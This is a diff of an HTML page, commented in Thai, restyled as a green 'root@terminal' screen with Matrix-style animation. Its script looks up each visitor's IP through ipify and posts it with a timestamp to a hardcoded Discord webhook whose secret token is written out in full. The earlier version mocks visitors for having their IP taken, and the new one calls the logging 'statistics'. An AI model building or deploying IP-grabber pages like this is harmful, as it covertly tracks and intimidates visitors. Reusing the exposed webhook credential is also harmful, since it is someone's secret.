@@ -3,49 +3,98 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>เว็บของฉัน</title>
+  <title>root@terminal</title>
   <style>
     * { box-sizing: border-box; margin: 0; }
-    body {
-      min-height: 100vh; display: flex; align-items: center; justify-content: center;
-      font-family: system-ui, sans-serif; color: #fff; text-align: center; padding: 24px;
-      background: linear-gradient(135deg, #5865f2, #1e1f3a);
+    html, body { height: 100%; background: #000; overflow: hidden; }
+    canvas { position: fixed; inset: 0; opacity: .35; }
+    .wrap {
+      position: relative; z-index: 1; height: 100%;
+      display: flex; align-items: center; justify-content: center; padding: 16px;
     }
-    .card {
-      background: rgba(255,255,255,.1); backdrop-filter: blur(10px);
-      padding: 40px 32px; border-radius: 20px; max-width: 420px;
+    .term {
+      width: 100%; max-width: 560px; background: rgba(0,10,0,.88);
+      border: 1px solid #00ff41; border-radius: 10px;
+      box-shadow: 0 0 25px rgba(0,255,65,.35); font-family: "Courier New", monospace;
+      color: #00ff41;
     }
-    h1 { font-size: 2rem; margin-bottom: 12px; }
-    p { opacity: .9; line-height: 1.6; }
-    small { display: block; margin-top: 24px; opacity: .65; font-size: .8rem; }
+    .bar {
+      padding: 8px 12px; border-bottom: 1px solid #00ff41; font-size: .8rem;
+      display: flex; gap: 6px; align-items: center;
+    }
+    .dot { width: 10px; height: 10px; border-radius: 50%; background: #00ff41; opacity: .6; }
+    .bar span { margin-left: 8px; opacity: .8; }
+    #out { padding: 16px; min-height: 220px; font-size: .95rem; line-height: 1.7; white-space: pre-wrap; word-break: break-word; }
+    .cursor { display: inline-block; width: 9px; height: 1em; background: #00ff41; vertical-align: middle; animation: blink 1s steps(1) infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
+    .note { padding: 10px 16px 14px; font-size: .72rem; opacity: .6; border-top: 1px dashed rgba(0,255,65,.4); }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>by SUNDAY</h1>
-    <p>โง่จัด ขอIPเเลัวกัน</p>
-    <small>เว็บนี้บันทึก IP ของมึงโง่</small>
+  <canvas id="rain"></canvas>
+  <div class="wrap">
+    <div class="term">
+      <div class="bar"><i class="dot"></i><i class="dot"></i><i class="dot"></i><span>root@terminal:~</span></div>
+      <div id="out"></div>
+      <div class="note">// เว็บนี้บันทึก IP bySUNDAY</div>
+    </div>
   </div>
 
   <script>
+    // ---------- Matrix rain ----------
+    const c = document.getElementById("rain"), x = c.getContext("2d");
+    let cols, drops;
+    function init() {
+      c.width = innerWidth; c.height = innerHeight;
+      cols = Math.floor(c.width / 16);
+      drops = Array(cols).fill(1);
+    }
+    init(); addEventListener("resize", init);
+    const chars = "01アイウエオカキクケコサシスセソ";
+    setInterval(() => {
+      x.fillStyle = "rgba(0,0,0,.08)"; x.fillRect(0, 0, c.width, c.height);
+      x.fillStyle = "#00ff41"; x.font = "16px monospace";
+      drops.forEach((y, i) => {
+        x.fillText(chars[Math.floor(Math.random() * chars.length)], i * 16, y * 16);
+        if (y * 16 > c.height && Math.random() > .975) drops[i] = 0;
+        drops[i]++;
+      });
+    }, 50);
+
+    // ---------- Terminal typing ----------
+    const out = document.getElementById("out");
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+    async function type(text, speed = 28) {
+      for (const ch of text) { out.textContent += ch; await sleep(speed); }
+    }
+    function cursor(on) {
+      let el = out.querySelector(".cursor");
+      if (on && !el) { el = document.createElement("span"); el.className = "cursor"; out.appendChild(el); }
+      if (!on && el) el.remove();
+    }
+
+    // ---------- แจ้ง Discord ----------
     const WEBHOOK = "https://discord.com/api/webhooks/1566010672658120764/Ixquirn6vSXk9nQwam2tkyhQ7fvW3jm7sWkrJVKau3XtZ44CbeB7S8s933cC6ZoMTcOn";
 
-    (async () => {
+    async function getIP() {
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        return (await r.json()).ip;
+      } catch (e) { return null; }
+    }
+
+    async function notify(ip) {
       try {
         const last = Number(localStorage.getItem("lastPing") || 0);
         if (Date.now() - last < 60000) return;
         localStorage.setItem("lastPing", Date.now());
-
-        const r = await fetch("https://api.ipify.org?format=json");
-        const { ip } = await r.json();
-
         await fetch(WEBHOOK, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             embeds: [{
               title: "🔔 มีคนเข้าเว็บ",
-              color: 0x5865f2,
+              color: 0x00ff41,
               fields: [
                 { name: "IP", value: "`" + ip + "`", inline: true },
                 { name: "เวลา", value: new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" }), inline: true },
@@ -55,6 +104,22 @@
           })
         });
       } catch (e) {}
+    }
+
+    // ---------- เริ่มทำงาน ----------
+    (async () => {
+      const ipPromise = getIP();
+      await type("> initializing system...\n");
+      await sleep(300);
+      await type("> connecting to server...\n");
+      await sleep(300);
+      await type("> [OK] connection established\n");
+      const ip = await ipPromise;
+      await type("> visitor IP : " + (ip || "unknown") + "\n");
+      await type("> access logged for statistics\n");
+      await type("\n> welcome, visitor_ \n");
+      cursor(true);
+      if (ip) notify(ip);
     })();
   </script>
 </body>
